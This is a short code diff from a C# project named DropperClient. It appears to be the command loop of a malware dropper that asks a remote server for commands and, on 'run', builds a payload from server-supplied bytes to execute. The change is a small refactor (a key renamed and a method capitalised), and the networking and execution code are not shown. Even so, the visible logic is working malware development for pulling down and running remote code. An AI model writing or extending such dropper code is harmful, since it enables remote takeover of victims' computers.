@@ -88,7 +88,7 @@ namespace DropperClient
             var getCommandResponse = requestSender.SendRequest(getCommandRequest);
             var jsonResponseData = JsonParser.Deserialize(getCommandResponse);
 
-            switch (jsonResponseData["Command"])
+            switch (jsonResponseData["command"])
             {
                 case "uninstall":
                     logger.LogMessage("Got Command uninstall");
@@ -97,7 +97,7 @@ namespace DropperClient
                 case "run":
                     logger.LogMessage("Got Command run");
                     var payloadData = (Dictionary<string, object>)jsonResponseData["Payload"];
-                    var payload = createPayload(payloadData);
+                    var payload = CreatePayload(payloadData);
                     var runCommand = new RunCommand(payload);
                     return runCommand;
 
@@ -109,7 +109,7 @@ namespace DropperClient
             return null;
         }
 
-        private static Payload createPayload(Dictionary<string, object> payloadData)
+        private static Payload CreatePayload(Dictionary<string, object> payloadData)
         {
             var newPayload = new Payload();
             newPayload.SetPayload(payloadData["PayloadBytes"].ToString());
